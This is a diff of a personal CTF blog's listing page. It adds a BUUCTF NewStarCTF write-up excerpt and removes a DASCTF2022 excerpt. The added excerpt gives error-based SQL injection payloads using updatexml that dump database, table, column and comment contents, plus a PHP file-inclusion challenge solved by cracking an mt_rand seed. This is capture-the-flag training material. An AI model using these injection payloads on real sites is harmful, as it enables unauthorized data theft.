@@ -110,6 +110,18 @@
         alt="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp"
         title="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp" /></a></div><h1 class="home-title">ThnPinkman's blog</h1><div class="home-subtitle"><div id="id-1" class="typeit"></div></div><div class="links"></div></div>
 <article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/ctf/buuctf-newstarctf/">BUUCTF NewStarCTF</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">week2 Word-For-You(2 Gen) 哇哇哇，我把查询界面改了，现在你们不能从数据库中拿到东西了吧哈哈（不过为了调试的代码似乎忘记删除了
+联合查询 ，没有回显点
+报错查询
+name=1&#39;and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+ name=1&#39;and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+ name=1&#39;and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;wfy_comments&#39;),0x7e),1)--+ name=1&#39;and updatexml(1,concat(0x7e,(select right(group_concat(text),28) from wfy.wfy_comments),0x7e),1)--+ IncludeOne 文件包含漏洞系列第一题，也不知道是不是真的随机？ 出题人丢给你了一个工具：https://www.openwall.com/php_mt_seed/
+&lt;?php highlight_file(__FILE__); error_reporting(0); include(&#34;seed.php&#34;); //mt_srand(*********); echo &#34;Hint: &#34;.mt_rand().&#34;&lt;br&gt;&#34;; if(isset($_POST[&#39;guess&#39;]) &amp;&amp; md5($_POST[&#39;guess&#39;]) === md5(mt_rand())){ if(!preg_match(&#34;/base|\.\./i&#34;,$_GET[&#39;file&#39;]) &amp;&amp; preg_match(&#34;/NewStar/i&#34;,$_GET[&#39;file&#39;]) &amp;&amp; isset($_GET[&#39;file&#39;])){ //flag in `flag.php` include($_GET[&#39;file&#39;]); }else{ echo &#34;Baby Hacker?&#34;; } }else{ echo &#34;No Hacker!&#34;; } Hint: 1219893521 给了mt_rand，用提示给的网站工具，进行爆破
+拿到正确的种子
+&lt;?php mt_srand(1145146); mt_rand(); echo mt_rand(); ?</div><div class="post-footer">
+        <a href="/posts/ctf/buuctf-newstarctf/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/posts/ctf/catctf/">CatCTF</a>
     </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
 </span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">MISC Cat_Jump 尝试了去打开玩游戏但是没搞定，直接strings了 非预期
@@ -183,17 +195,6 @@ https://datatracker.ietf.org/doc/html/rfc2324对应上了You should add the mil
 Accept-Additions: milktea 添加后GET访问即可</div><div class="post-footer">
         <a href="/posts/ctf/dasctf-7%E6%9C%88/">Read More</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/ctf/dasctf2022%E4%B8%83%E6%9C%88%E8%B5%9B/">DASCTF2022七月赛</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">Ez to getflag （Phar反序列化+条件竞争） phar 发序列化
-出现非预期了
-预期： 扒下来源码，直接读文件就行，不需要目录穿越
-file.php
-&lt;?php error_reporting(0); session_start(); require_once(&#39;class.php&#39;); $filename = $_GET[&#39;f&#39;]; $show = new Show($filename); $show-&gt;show(); ?&gt; class.php，是主要源码
-&lt;?php class Upload { public $f; public $fname; public $fsize; function __construct(){ $this-&gt;f = $_FILES; } function savefile() { $fname = md5($this-&gt;f[&#34;file&#34;][&#34;name&#34;]).&#34;.png&#34;; if(file_exists(&#39;./upload/&#39;.$fname)) { @unlink(&#39;./upload/&#39;.$fname); } move_uploaded_file($this-&gt;f[&#34;file&#34;][&#34;tmp_name&#34;],&#34;upload/&#34; . $fname); echo &#34;upload success! :D&#34;; } function __toString(){ $cont = $this-&gt;fname; $size = $this-&gt;fsize; echo $cont-&gt;$size; return &#39;this_is_upload&#39;; } function uploadfile() { if($this-&gt;file_check()) { $this-&gt;savefile(); } } function file_check() { $allowed_types = array(&#34;png&#34;); $temp = explode(&#34;.</div><div class="post-footer">
-        <a href="/posts/ctf/dasctf2022%E4%B8%83%E6%9C%88%E8%B5%9B/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
 </article><ul class="pagination"><li class="page-item ">
                     <span class="page-link">
                         <a href="/">1</a>
@@ -218,12 +219,12 @@ file.php
                     <span class="page-link" aria-hidden="true">&hellip;</span>
                 </li><li class="page-item ">
                     <span class="page-link">
-                        <a href="/page/11/">11</a>
+                        <a href="/page/12/">12</a>
                     </span>
                 </li></ul></div></div>
             </main><footer class="footer">
         <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
-                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
         </div>
     </footer></div>
 
